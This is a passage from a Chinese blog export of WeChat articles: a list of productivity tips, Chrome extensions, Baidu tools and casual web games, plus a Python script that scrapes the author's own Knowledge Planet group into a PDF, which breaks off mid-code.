    <content type="text"><![CDATA[过去几个月公众号坚持每周更新，一周不拉，我都佩服自己坚持这么久，不知不觉更新了近50篇原创文章，由于平常要上班，所以一般都是周末写文章（还好新浪没有996），其实写完一篇文章挺费时的，我也不写无聊的口水文，每篇文章都要整理，测试，校对，经常写到凌晨一点。 还好这个号关注人数在不断增加，星球也450+人了，有兴趣免费加入我的星球，几乎每天更新一些有意思的内容，我几乎把它当微博用。 文章多了，翻历史记录也不方便，所以这里做个整理，方便大家查看。 奇技淫巧这个系列写了9篇了，之后还会更新。 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的知乎奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的 bilibili 奇技淫巧 微信这个系列是关于微信的一些实用技巧。 那些你可能不知道的微信奇技淫巧 微信好友头像拼图 如何发一条空白的朋友圈 如何在电脑上登陆多个微信 朋友圈点赞生成器 我是如何用 Markdown 写公众号文章的 想看的公众号文章被删了怎么办？ 公众号苏生不惑原创文章整理 PythonPython是个很好的脚本语言，用来处理一些日常工作还是很方便的。 Python 文档生成器 mkdocs 比 man 更强悍的命令行工具 cheat ffmpeg 将视频转GIF 5 分钟使用 hugo 搭建一个自己的博客 命令行录制工具 asciinema ppt 神器 reveal Pyhon 爬虫框架 looter Python 抓取知识星球内容生成词云和 PDF 各种数据库命令行工具 mycli litecli mssql-cli pgcli 工具工欲善其事，必先利其器，这些工具能更好的帮助你。 那些我常用的 Chrome 扩展 那些除百度以外你可能不知道的小众搜索引擎 那些你可能不知道的 ocr 图片文字识别工具 那些你可能不知道的 PDF 工具 那些你可能用得上的简历写作工具 有意思的举牌告白小人 Chrome 浏览器扩展神器油猴 那些你可能不知道的百度文库/网盘快速下载工具 Chrome 浏览器扩展神器暴力猴 那些你可能不知道的文件分享工具 没有提取码怎么获取百度网盘资源？ 怕被发垃圾邮件？用临时邮箱来注册账号 如何下载优酷 m3u8 格式的视频文件？ 工作生活工作压力太大，偶尔摸鱼娱乐下是有必要的。 那些你可能不知道的百度产品 上班工作压力太大?来玩个游戏解压下 听说你想 520 表白 如何提取公积金 9 天到账 免费在线听周杰伦歌曲 如何在豆瓣租房小组快速找到满意的房子 10%+10% 不等于 0.2？ 我的新浪工作日常 上班摸鱼好去处 历史上消失的那 10 天去哪了？ 表白新姿势 其中 阅读量最高分享最多的文章是这篇 如何发一条空白的朋友圈，你也来发条空白朋友圈装逼下吧。 其次就是那些你可能不知道的 bilibili 奇技淫巧 ，如何在豆瓣租房小组快速找到满意的房子 ，那些你可能不知道的视频下载奇技淫巧 这几篇。 公众号词云写了这么多文章，来看看我的文章都涉及写哪些内容，这里用新榜的词云工具，输入公众号名称就行。https://data.newrank.cn/wordCloud.html 效果如图，看来我写百度，奇技淫巧最多。 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些我常用的 Chrome 扩展续]]></title>
    <url>%2F2019%2F10%2F09%2F%E9%82%A3%E4%BA%9B%E6%88%91%E5%B8%B8%E7%94%A8%E7%9A%84-Chrome-%E6%89%A9%E5%B1%95%E7%BB%AD%2F</url>
    <content type="text"><![CDATA[之前分享过那些我常用的 Chrome 扩展 ，一篇文章内容有限，于是有了后续篇。 微贝这是一个微博备份的扩展，由于没有上架，只能下载到本地安装，下载地址https://share.weiyun.com/56v1cyU，具体使用见微博https://weibo.com/1088413295/I7MAriyVV ，需要用微信扫码登录。 微信同步助手微信公众号文章多平台同步，支持今日头条、WordPress、知乎、简书、typecho各大平台，一次发布，多平台同步发布。解放个人生产力，不用每个平台都复制一遍发布。 比如这篇文章 那些你可能不知道的 bilibili 奇技淫巧，先登录知乎和简书，然后直接同步到简书和知乎。 Chrome扩展地址 https://chrome.google.com/webstore/detail/%E5%BE%AE%E4%BF%A1%E5%90%8C%E6%AD%A5%E5%8A%A9%E6%89%8B/hchobocdmclopcbnibdnoafilagadion?hl=zh-CN Easy to RSS很多网站都有rss，可以让用户获取网站内容的最新更新。这个扩展可以直接获取网页RSS，复制到剪贴板并打开该RSS网页，并且与RSSHub联动。 比如b站up主 电影talks 的主页https://space.bilibili.com/319751089/，点击右侧rss可以看到获取动态，专栏文章等。用户动态rss 链接 https://rsshub.app/bilibili/user/dynamic/319751089Chrome扩展地址 https://chrome.google.com/webstore/detail/easy-to-rss/hbcmpkcpbnecinpngdnfbnknfkdpdfli 哔哩哔哩助手这是一个b站 辅助工具 https://bilibili-helper.github.io/ ，可以替换播放器、去广告、推送通知并进行一些快捷操作。 比如这个视频 https://www.bilibili.com/video/av10914119 ，安装扩展登录b站后右侧有个助手按钮，可以直接下载当前播放的视频和弹幕。 Chrome扩展地址 https://chrome.google.com/webstore/detail/%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9%E5%8A%A9%E6%89%8B%EF%BC%9Abilibilicom-%E7%BB%BC%E5%90%88%E8%BE%85%E5%8A%A9%E6%89%A9%E5%B1%95/kpbnombpnpcffllnianjibmpadjolanh Smallpdf轻松易用的PDF工具，可用于编辑、转换、合并、拆分和压缩PDF文件，可与Gmail整合。 Chrome扩展地址https://chrome.google.com/webstore/detail/smallpdf/ohfgljdgelakfkefopgklcohadegdpjf 超级马里奥兄弟在Chrome浏览器上享受经典的超级马里奥兄弟游戏！偶尔娱乐下不错。使用方法：x 跳跃，z 射弹，回车键开始或暂停，左右键左右移动。如果不想安装扩展还有个网页版https://www.yikm.net/ Chrome扩展地址 https://chrome.google.com/webstore/detail/super-mario-bros/ihiihnpekihcakcmjogkjncdgfdbjpnh 开发工具箱经常要做编码转换，加密什么的，这个工具非常方便，不用再谷歌了。 Chrome扩展下载地址https://chrome.google.com/webstore/detail/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7%E7%AE%B1/mflanociobpenleccopmoanpdbcjcanm 查看类似网站这个扩展能让你获得正访问的网站相关的10个类似网站结果，来看看微博类似的有Facebook,baidu。当然也可以在网站https://www.similarsites.com/welcome输入查看。 Chrome扩展地址 https://chrome.google.com/webstore/detail/similar-sites-discover-re/necpbmbhhdiplmfhmjicabdeighkndkn 豆瓣电影传送门妈妈再也不会担心我找不到资源了，直接在豆瓣电影右侧显示可以观看电影的链接。Chrome扩展地址 https://chrome.google.com/webstore/detail/%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%E4%BC%A0%E9%80%81%E9%97%A8/pkidecliagangmpphpelecaoogfbnihi 安装可能遇到的问题：该扩展程序未列在 Chrome 网上应用店中，并可能是在您不知情的情况下添加的，解决：12341、首先把需要安装的第三方插件，后缀.crx 改成 .rar，然后解压，得到一个文件夹2、再打开chrome://extensions/谷歌扩展应用管理，点击右上角的开发者模式，就可以看到“加载正在开发的扩展程序”这一选项。3、选择刚才步骤1中解压好的文件夹，确定4、确认新增扩展程序，点击添加，成功添加应用程序。 以上扩展的安装都需要能访问谷歌，所以你还需要谷歌助手，公众号 回复 谷歌 获取。 其他复制图片文字https://projectnaptha.com/官网Git History介绍只需要将 GitHub 仓库的 『github.com』网址替换为『github.githistory.xyz』，则可以动态显示文件的提交历史https://10beasts.net/best-vpn/china/https://laod.cn/news/googles-21st-birthday.html 谷歌镜像网址 RSS 阅读器了 https://mp.weixin.qq.com/s?__biz=MzI5MDM4NTYwOA==&amp;mid=2247488671&amp;idx=1&amp;sn=2c5d7a459e8dbf3345481f982ed37e0e&amp;chksm=ec21ef38db56662eb0755a9ab0cb34adbf155ead565822e83f9b2a7307f37e440dc9d9d00d6a&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1566260194390&amp;sharer_shareid=ae8eb1508a08c1b134df82bb484ea38d#rd科学上网 https://strivebo.com/2019/02/12/%E7%AF%871%EF%BC%9A%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/墙外https://www.bvsuper.com/index.php/archives/183/SetupVPN 墙外指南https://tingtalk.me/archives/http://tengj.top/2018/02/17/ggcj/ 实用且堪称神器的Chrome插件推荐分享一些好用的 Chrome 扩展https://4ark.me/post/549a6198.html#16-Git-History相见恨晚的 chrome 扩展程序https://www.v2ex.com/t/516205Google Chrome 有什么推荐的插件https://www.v2ex.com/t/501604Chrome 上面有什么可以提高程序员效率的好用的插件推荐https://cn.v2ex.com/t/602480#reply45你极力推荐的 Chrome 扩展有哪些https://www.v2ex.com/t/515681方便地查看、整理、搜索你已经 Star 过的项目和搜索 Github 上的项目https://github.com/lvxianchao/the-fucking-github Github API 的图床 Chrome 插件开发全纪录 https://www.v2ex.com/t/562408微信群合影Chrome插件英雄榜https://juejin.im/post/5c6824076fb9a049c966374c无需安装 Office，即可使用 Word、Excel、PowerPoint、OneNote 和 Sway Onlinehttps://chrome.google.com/webstore/detail/office/ndjpnladcallmjemlbaebfadecfhkepb星球链接 https://t.zsxq.com/iE2f6mu分享一些好用的 Chrome 扩展 https://4ark.me/post/549a6198.html那些离不开的 Chrome 扩展插件 https://michael728.github.io/2015/11/26/tools-chrome-extentions/Chrome 插件推荐 推荐阅读: 如何发一条空白的朋友圈 免费在线听周杰伦歌曲 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 10%+10% 不等于 0.2？ Chrome 浏览器扩展神器油猴 那些你可能不知道的 bilibili 奇技淫巧 上班工作压力太大?来玩个游戏解压下 那些你可能不知道的百度产品 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的百度产品]]></title>
    <url>%2F2019%2F09%2F30%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E7%99%BE%E5%BA%A6%E4%BA%A7%E5%93%81%2F</url>
    <content type="text"><![CDATA[百度家的产品可谓不少，搜索就不说了，https://www.baidu.com/more/ 这里还有很多，估计很多你也没用过。 除了搜索，这里推荐几个百度出品的良心产品。 百度脑图思维导图又叫心智图，因为它直观、形象、易于理解和梳理而受欢迎，百度脑图类似网页版的 Office，可以直接在浏览器上制作思维导图。https://naotu.baidu.com/需要登录百度账号使用。 另外还有桌面版，在没有互联网的情况下，依然可以使用这款免费的思维导图工具，跨平台支持 Windows/Linux/Mac OS ，下载地址https://github.com/NaoTu/DesktopNaotu/releases 百度取证百度取证是百度联合司法鉴定中心、公证机构，共同推出的电子数据固定及保全系统，可为用户提供取证、存证、出证的一站式在线服务，如果原创作品或知识产权被侵犯了可以试试这个。 百度网盘随着360云盘，新浪微盘等关闭个人存储服务，现在只剩下百度网盘这个良心产品了,现在我的网盘保存了不少文件和电影，分享文件也用的百度网盘，之前写过文章 没有提取码怎么获取百度网盘资源？ 如果嫌百度网盘下载限速很慢，可以考虑使用第三方客户端 https://pan-light.peterq.cn ，当然更推荐你购买会员支持下百度 https://pan.baidu.com/buy/center#/svip 百度图说https://tushuo.baidu.com/ 向粗糙图表 Say Goodbye! 百度图说是基于Echarts一个傻瓜式图表工具，无需代码基础就可以做出屌炸天的动态图表！https://tushuo.baidu.com/prod/viewProd?prodId=dta8kgu4v3g3ick8s&amp;cli=win 登录百度账号就能很方便在线制作一个图表了。 百度的其他可视化产品在https://vis.baidu.com/ 百度识图直接输入图片地址或上传图片可以搜到图片信息。http://image.baidu.com/?fr=shitu 百度短网址有时候网址太长很难看，比如公众号的pc文章链接 http://mp.weixin.qq.com/s?__biz=MzIyMjg2ODExMA==&amp;mid=2247484127&amp;idx=1&amp;sn=dca59ac8530476cd8fef626da81d5aff&amp;chksm=e827a53edf502c286ecea267989f9c39576d7ce9c3f605015470f709c0cd1bbb4320d9bf5b63&amp;token=743146443&amp;lang=zh_CN#rd ，将链接在 https://dwz.cn/ 转换下就能生成短链接 https://dwz.cn/jFnZD9Xp ,这个和微博的t.cn类似。 百度文库https://wenku.baidu.com/ 关于百度文库之前写过文章 那些你可能不知道的百度文库/网盘快速下载工具 免费下载文库在公众号回复 文库 获取下载工具。 百度字体http://fontstore.baidu.com/static/editor/index.html 害怕使用的字体侵权可以自己设计个字体。当然如果自己没有设计能力可以使用免费的商用字体 https://100font.com 简单搜索http://www.searchcraft.cn/http://secr.baidu.com/ 最后说个百度的搜索特效，可能很多人没见过，比如搜索黑洞搜索表白，之前也写过听说你想 520 表白 还有很多这样的关键词彩蛋，比如 抖动， duang，旋转等，可以自己搜索体验下，第一次看到的时候还有点惊艳。更多搜索技巧看之前的文章 那些你可能不知道的搜索奇技淫巧 其他氢小说(H2 Book)是我们定义的一种对话体、类剧本式的开放图书格式。它采用对话和场景来展现故事、描述事实，又非常接近于我们平时使用的聊天软件，所以读起来更为轻松。https://github.com/easychen/h2reader-host https://qing.ftqq.com/#/ 【网易见外】为视频自动生成字幕、音频转文字等等 https://jianwai.netease.com/百度识图可以用来当免费的图床，还不防盗链不限速 的百度网盘客户端 https://github.com/peterq/pan-light输入网盘链接和提取码https://labs.nazo.moe/netdisk.html NetDisk Downloader百度http://cnm.buhuibaidu.mehttps://www.echartsjs.com/zh/index.htmlhttps://www.zhihu.com/question/20512556 https://www.zhihu.com/question/39567389https://www.zhihu.com/question/39371134BAT出品的PPT神器https://zhuanlan.zhihu.com/p/28686098百度网盘直链下载助手手把手教你满速下载百度网盘文件 2019 百度云不限速下载教程 https://cn.v2ex.com/t/600571#reply32当然要用 chrome 的 aria2 插件啦 https://github.com/acgotaku/BaiduExporter免费在线思维导图软件 https://gitmind.cn/ 腾讯8分钟https://app.gitmind.cn/doc/5054448在线协作编辑器 http://we.woshifyz.com/ 如果文章对你有帮助还望不吝点个在看支持下，感谢。 推荐阅读: 如何发一条空白的朋友圈 免费在线听周杰伦歌曲 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 10%+10% 不等于 0.2？ Chrome 浏览器扩展神器油猴 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[上班工作压力太大?来玩个游戏解压下]]></title>
    <url>%2F2019%2F09%2F30%2F%E4%B8%8A%E7%8F%AD%E5%B7%A5%E4%BD%9C%E5%8E%8B%E5%8A%9B%E5%A4%AA%E5%A4%A7-%E6%9D%A5%E7%8E%A9%E4%B8%AA%E6%B8%B8%E6%88%8F%E8%A7%A3%E5%8E%8B%E4%B8%8B%2F</url>
    <content type="text"><![CDATA[996工作压力太大，下班或者周末来玩几个解压的小游戏缓解下。 毒鸡汤先来碗毒鸡汤 http://nows.fun/ 太鼓达人这个解压小游戏源自日本网站 https://aidn.jp/mikuwarp/ 一个基于初音未来创作的减压神器，点击屏幕即可生成一段音乐，他还有其他游戏在https://aidn.jp/contents/ 因为访问速度的原因有人开发了国内版本 https://static.hfi.me/mikutap/，而且还开源了 https://github.com/HFIProgramming/mikutap ，它是通过点击屏幕来让Miku发出可爱的声音，这个游戏非常简单，靠指尖触碰就可以自己创作一首歌曲。 电脑上可以疯狂敲键盘或者鼠标，手机上可以疯狂点击屏幕。 生成的音乐可以用 ScreenToGif 等软件录下来。 微博上不少人玩过 对应的还有安卓版 https://www.coolapk.com/apk/at.rbq.mikutap 小霸王超级玛丽和魂斗罗等游戏很多人小时候玩过，这是网页版的小霸王 https://www.yikm.net/ 可以让你重温童年的乐趣。 PC 端 w s a d 分别是上下左右，j k 分别是攻击和跳，b 是选择，回车是开始。你要不来试试？ 手鼓猫一只可爱的小猫在桌子上敲手鼓，玩法：A&amp;D 键位可以敲鼓，C 键敲锣，Q&amp;W…&amp;O&amp;P键位可以弹竖琴，数字键弹钢琴，空格键用来发出喵叫，适合放松下手指，在线试玩：https://bongo.cat/比如敲以下数字是一首生日快乐歌。121 1 3 1 6 51 1 3 1 8 6 滑雪撬一个小游戏，用笔画出一条线，小人就沿着线滑雪撬，可以翻跟头，下滑，倒退，如果你画出一个满意的线路，还可以保存成视频，在线试玩：https://www.linerider.com/ 其他玩了一个上午Mikutap之后，我理解了它走红的原因https://www.qdaily.com/articles/56872.html 基于canvas和web audio实现低配版MikuTaphttps://github.com/zzuzsj/ZsaiMiku.git分享一个超带感有趣的网站mikutap https://www.qtbox.cn/share/miku.html https://www.qtbox.cn/miku/https://www.v2ex.com/t/558899?p=1一款有趣的音乐解压游戏 https://www.cocosec.com/archives/74.html 小霸王：https://www.yikm.net https://www.v2ex.com/t/403054在线 dos 游戏：https://dos.zczc.cz/Bongo Cat 手鼓猫：A&amp;D 键位可以敲鼓，C 键敲锣，Q&amp;W…&amp;O&amp;P键位可以弹竖琴，数字键弹钢琴，空格键用来发出喵叫，适合放松下手指摸个鱼，在线试玩：https://bongo.cat/ https://github.com/Externalizable/bongo.catmagickeyboard：一个摸鱼解压网站，会将你输入的字符从屏幕下方弹起，并伴有清脆的敲击声。在线访问：http://magickeyboard.io/ https://github.com/feross/magickeyboard.io撘楼分享个摸鱼网站： https://tophub.fun 全平台支持 https://www.printf520.com/hot.html主要功能是对整个文档进行翻译，100多种不同语言文档可任意转换，无需注册https://www.onlinedoctranslator.com/塔防：https://yorg.io/linerider：一个小游戏，用笔画出一条线，小人就沿着线滑雪撬，可以翻跟头可以下滑可以倒退，N种不同的结果全在你的掌握，如果你画出一个满意的线路，还可以保存成视频~在线试玩：https://www.linerider.com/游戏合集：http://iogames.space/ 推荐阅读: 如何发一条空白的朋友圈 免费在线听周杰伦歌曲 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 10%+10% 不等于 0.2？ Chrome 浏览器扩展神器油猴 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 抓取知识星球内容生成 PDF]]></title>
    <url>%2F2019%2F09%2F16%2FPython-%E6%8A%93%E5%8F%96%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E5%86%85%E5%AE%B9%E7%94%9F%E6%88%90-PDF%2F</url>
    <content type="text"><![CDATA[知识星球是什么? 知识星球是创作者连接铁杆粉丝，做出高品质社群，实现知识变现的工具。创作者可以用知识星球连接铁杆粉丝，做出高品质社群，实现知识变现。知识星球解决的核心问题是社群收费管理难问题和内容不能沉淀问题。微信公众号、微博和行业专家——这些有粉丝的创作者是知识星球的核心用户，都可以用知识星球运营社群，知识变现。 以上来自知识星球官网的介绍 https://help.zsxq.com/ 口号是连接1000位铁杆粉丝。 为什么用星球我没做过社群，也不是什么行业专家，毕竟不是什么大v，为什么要用知识星球呢？主要是现在获取的资讯太多了，想沉淀记录些东西，方便自己，也方便他人找，为什么不用微博呢？微博用了很多年，每天都在更新，目前已经8万多条微博了。 微博上有很多mark党，不断转发微博，但几乎没再去看过，不知道你是否也这样，以为收藏就看过了，其实只是种心里安慰。 而且微博上转发的东西经常被删，微博太多管理起来也麻烦，于是6月份的时候建立了一个免费的星球，就是这个了https://wx.zsxq.com/dweb2/index/group/141281112142星球还可以上传文件，和微博一样加标签方便分类，还提供网页版，比微信方便多了。 导出星球过去3个月更新几百条信息了，也都加好标签。现在有200多个小伙伴了，你有兴趣也加入吧。比如工具这个标签列表的内容https://wx.zsxq.com/dweb2/index/tags/%E5%B7%A5%E5%85%B7/828821151512 但内容多了以后翻起来也麻烦，于是想着下载下来看，最好能导出PDF，于是准备研究下，搜索下发现有人已经做过了 https://github.com/wbsabc/zsxq-spider https://github.com/96chh/crawl-zsxq思路为抓取网页版的接口https://api.zsxq.com/v1.10/groups/141281112142/topics?scope=all&amp;count=20 每次加载20条，每次的最后一条的create_time为下次的开始时间，如果没有20条说明加载完了。不过他的代码还有些问题，需要改动下，于是开始动手了。import reimport requestsimport jsonimport osimport pdfkitimport shutilimport datetimeimport urllib.requestfrom bs4 import BeautifulSoupfrom urllib.parse import quotefrom urllib.parse import unquoteimport re,jieba,pandas as pdimport matplotlib.pyplot as pltfrom wordcloud import WordCloud, STOPWORDS, ImageColorGeneratorimport numpy as npfrom pyquery import PyQueryZSXQ_ACCESS_TOKEN = '2B9BA4A2-8CAB-3A7C-32E7-' # 登录后Cookie中的TokenGROUP_ID = '142452821282' # 知识星球中的小组ID 141281112142 每日分享554228114224PDF_FILE_NAME = '知识星球_斜杠星球.pdf' # 生成PDF文件的名字DOWLOAD_PICS = False # 是否下载图片 True | False 下载会导致程序变慢DOWLOAD_COMMENTS = False # 是否下载评论ONLY_DIGESTS = False # True-只精华 | False-全部FROM_DATE_TO_DATE = False # 按时间区间下载EARLY_DATE = '2017-05-25T00:00:00.000+0800' # 最早时间 当FROM_DATE_TO_DATE=True时生效 为空表示不限制 形如'2017-05-25T00:00:00.000+0800'LATE_DATE = '2019-09-25T00:00:00.000+0800' # 最晚时间 当FROM_DATE_TO_DATE=True时生效 为空表示不限制 形如'2017-05-25T00:00:00.000+0800'DELETE_PICS_WHEN_DONE = True # 运行完毕后是否删除下载的图片DELETE_HTML_WHEN_DONE = True # 运行完毕后是否删除生成的HTMLCOUNTS_PER_TIME = 30 # 每次请求加载几个主题 最大可设置为30DEBUG = False # DEBUG开关DEBUG_NUM = 120 # DEBUG时 跑多少条数据后停止 需与COUNTS_PER_TIME结合考虑html_template = """&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;&#123;title&#125;&lt;/h1&gt;&lt;br&gt;&#123;author&#125; - &#123;cretime&#125;&lt;br&gt;&lt;p&gt;&#123;text&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;"""htmls = []num = 0def headers_to_dict(headers): """ 将字符串 ''' Host: mp.weixin.qq.com Connection: keep-alive Cache-Control: max-age= ''' 转换成字典类型 :param headers: str :return: dict """ headers = headers.split("\n") d_headers = dict() for h in headers: h = h.strip() if h: k, v = h.split(":", 1) d_headers[k] = v.strip() return d_headersdef get_data(url): OVER_DATE_BREAK = False global htmls, num header = """Accept:application/json, text/plain, */*Accept-Encoding:gzip, deflate, brAccept-Language:zh-CNConnection:keep-aliveCookie:sensorsdata2015jssdkcross=%7B%22dis ; zsxq_access_token=BA53 6025ADNT:1Host:api.zsxq.comOrigin:https://wx.zsxq.comReferer:https://wx.zsxq.com/dweb2/index/group/224445125221User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36 Maxthon/5.2.7.5000X-Request-Id:fcf935489-5997-674e-9db2-a02ea9b389fX-Signature:81b69d88df26231776893554ec8d733448743908X-Timestamp:1567682270X-Version:1.10.17 """ headers = headers_to_dict(header) t = [] rsp = requests.get(url, headers=headers) print(url,headers,rsp.json()) """ cat temp.json &#123; "succeeded": true, "resp_data": &#123; "topics": [] &#125; &#125; cat temp.css h1 &#123;font-size:40px; color:red; text-align:center;&#125; p &#123;font-size:30px;&#125; img&#123; max-width:100%; margin:20px auto; height:auto; border:0; outline:0 -webkit-box-shadow: 1px 4px 16px 8px #5CA2BE; -moz-box-shadow: 1px 4px 16px 8px #5CA2BE; box-shadow: 1px 4px 16px 8px #5CA2BE; /*set the images aligned*/ display: block; margin-left: auto; margin-right: auto; &#125; """ with open('temp.json', 'w', encoding='utf-8') as f: # 将返回数据写入temp.json方便查看 f.write(json.dumps(rsp.json(), indent=2, ensure_ascii=False)) with open('temp.json', encoding='utf-8') as f, open('contents2.txt', 'a+', encoding='utf-8') as f2: for topic in json.loads(f.read()).get('resp_data').get('topics'): if FROM_DATE_TO_DATE and EARLY_DATE.strip(): if topic.get('create_time') &lt; EARLY_DATE.strip(): OVER_DATE_BREAK = True break content = topic.get('question', topic.get('talk', topic.get('task', topic.get('solution')))) anonymous = content.get('anonymous') if anonymous: author = '匿名用户' else: author = content.get('owner').get('name') cretime = (topic.get('create_time')[:23]).replace('T', ' ') text = content.get('text', '') f2.write(text) text = handle_link(text) #f2.write(PyQuery(text).text()) t.append(text) title = str(num) + '_' + cretime[:16] num += 1 if topic.get('digested') == True: title += '_精华' if DOWLOAD_PICS and content.get('images'): soup = BeautifulSoup(html_template, 'html.parser') images_index = 0 for img in content.get('images'): url = img.get('large').get('url') local_url = './images/' + str(num - 1) + '_' + str(images_index) + '.jpg' images_index += 1 urllib.request.urlretrieve(url, local_url) img_tag = soup.new_tag('img', src=local_url) soup.body.append(img_tag) html_img = str(soup) html = html_img.format(title=title, text=text, author=author, cretime=cretime) else: html = html_template.format(title=title, text=text, author=author, cretime=cretime) if topic.get('question'): answer_author = topic.get('answer').get('owner').get('name', '') answer = topic.get('answer').get('text', "") answer = handle_link(answer) soup = BeautifulSoup(html, 'html.parser') answer_tag = soup.new_tag('p') answer = '【' + answer_author + '】 回答：&lt;br&gt;' + answer soup_temp = BeautifulSoup(answer, 'html.parser') answer_tag.append(soup_temp) soup.body.append(answer_tag) html = str(soup) files = content.get('files') if files: files_content = '&lt;i&gt;文件列表(需访问网站下载) :&lt;br&gt;' for f in files: files_content += f.get('name') + '&lt;br&gt;' files_content += '&lt;/i&gt;' soup = BeautifulSoup(html, 'html.parser') files_tag = soup.new_tag('p') soup_temp = BeautifulSoup(files_content, 'html.parser') files_tag.append(soup_temp) soup.body.append(files_tag) html = str(soup) comments = topic.get('show_comments') if DOWLOAD_COMMENTS and comments: soup = BeautifulSoup(html, 'html.parser') hr_tag = soup.new_tag('hr') soup.body.append(hr_tag) for comment in comments: comment_str = '' if comment.get('repliee'): comment_str = '[' + comment.get('owner').get('name') + ' 回复 ' + comment.get('repliee').get('name') + '] : ' + handle_link(comment.get('text')) else: comment_str = '[' + comment.get('owner').get('name') + '] : ' + handle_link(comment.get('text')) comment_tag = soup.new_tag('p') soup_temp = BeautifulSoup(comment_str, 'html.parser') comment_tag.append(soup_temp) soup.body.append(comment_tag) html = str(soup) htmls.append(html) # DEBUG 仅导出部分数据时使用 if DEBUG and num &gt;= DEBUG_NUM: return htmls if OVER_DATE_BREAK: return htmls next_page = rsp.json().get('resp_data').get('topics') if next_page: create_time = next_page[-1].get('create_time') if create_time[20:23] == "000": end_time = create_time[:20]+"999"+create_time[23:] str_date_time = end_time[:19] delta = datetime.timedelta(seconds=1) date_time = datetime.datetime.strptime(str_date_time, '%Y-%m-%dT%H:%M:%S') date_time = date_time - delta str_date_time = date_time.strftime('%Y-%m-%dT%H:%M:%S') end_time = str_date_time + end_time[19:] else : res = int(create_time[20:23])-1 end_time = create_time[:20]+str(res).zfill(3)+create_time[23:] # zfill 函数补足结果前面的零，始终为3位数 end_time = quote(end_time) if len(end_time) == 33: end_time = end_time[:24] + '0' + end_time[24:] next_url = start_url + '&amp;end_time=' + end_time print(next_url) get_data(next_url) return htmls,tdef handle_link(text): soup = BeautifulSoup(text, "html.parser") mention = soup.find_all('e', attrs=&#123;'type' : 'mention'&#125;) if len(mention): for m in mention: mention_name = m.attrs['title'] new_tag = soup.new_tag('span') new_tag.string = mention_name m.replace_with(new_tag) hashtag = soup.find_all('e', attrs=&#123;'type' : 'hashtag'&#125;) if len(hashtag): for tag in hashtag: tag_name = unquote(tag.attrs['title']) new_tag = soup.new_tag('span') new_tag.string = tag_name tag.replace_with(new_tag) links = soup.find_all('e', attrs=&#123;'type' : 'web'&#125;) if len(links): for link in links: title = unquote(link.attrs['title']) href = unquote(link.attrs['href']) new_a_tag = soup.new_tag('a', href=href) new_a_tag.string = title link.replace_with(new_a_tag) text = str(soup) text = re.sub(r'&lt;e[^&gt;]*&gt;', '', text).strip() text = text.replace('\n', '&lt;br&gt;') return textdef make_pdf(htmls): html_files = [] for index, html in enumerate(htmls): file = str(index) + ".html" html_files.append(file) with open(file, "w", encoding="utf-8") as f: f.write(html) options = &#123; "user-style-sheet": "temp.css", "page-size": "Letter", "margin-top": "0.75in", "margin-right": "0.75in", "margin-bottom": "0.75in", "margin-left": "0.75in", "encoding": "UTF-8", "custom-header": [("Accept-Encoding", "gzip")], "cookie": [ ("cookie-name1", "cookie-value1"), ("cookie-name2", "cookie-value2") ], "outline-depth": 10, &#125; try: pdfkit.from_file(html_files, PDF_FILE_NAME, options=options) except Exception as e: pass if DELETE_HTML_WHEN_DONE: for file in html_files: os.remove(file) print("电子书生成成功！")def wordimage(content): comments = '' for k in range(len(content)): comments = comments + (str(content[k])).strip() doc = PyQuery(comments) #使用正则表达式去除标点符号 #pattern = re.compile(r'[\u4e00-\u9fa5]+') #filterdata = re.findall(pattern, comments) #cleaned_comments = ''.join(filterdata) cleaned_comments = ''.join(jieba.cut(doc.text())) print(cleaned_comments) #使用结巴分词进行中文分词 segment = jieba.lcut(cleaned_comments) words_df=pd.DataFrame(&#123;'segment':segment&#125;) #去掉停用词，先下载https://github.com/wendy1990/short_text_classification/blob/master/conf/stopwords.txt stopwords=pd.read_csv("stopwords.txt",index_col=False,quoting=3,sep="\t",names=['stopword'], encoding='utf-8')#quoting=3全不引用words_df=words_df[~words_df.segment.isin(stopwords.stopword)] #统计词频 看看哪些词出现概率高 words_stat=words_df.groupby(by=['segment'])['segment'].agg(&#123;"计数":np.size&#125;) words_stat=words_stat.reset_index().sort_values(by=["计数"],ascending=False) #print(words_stat.head(1000).values) stopwords = set(STOPWORDS) #用词云进行显示 wordcloud=WordCloud(font_path="c:\windos\fonts\simhei.ttf",background_color="white",max_font_size=80,stopwords=STOPWORDS.add("said")).generate(cleaned_comments) #word_frequence = &#123;x[0]:x[1] for x in words_stat.head(1000).values&#125; #word_frequence_list = [] #for key in word_frequence: # temp = (key,word_frequence[key]) # word_frequence_list.append(temp) #wordcloud=wordcloud.fit_words(word_frequence_list) 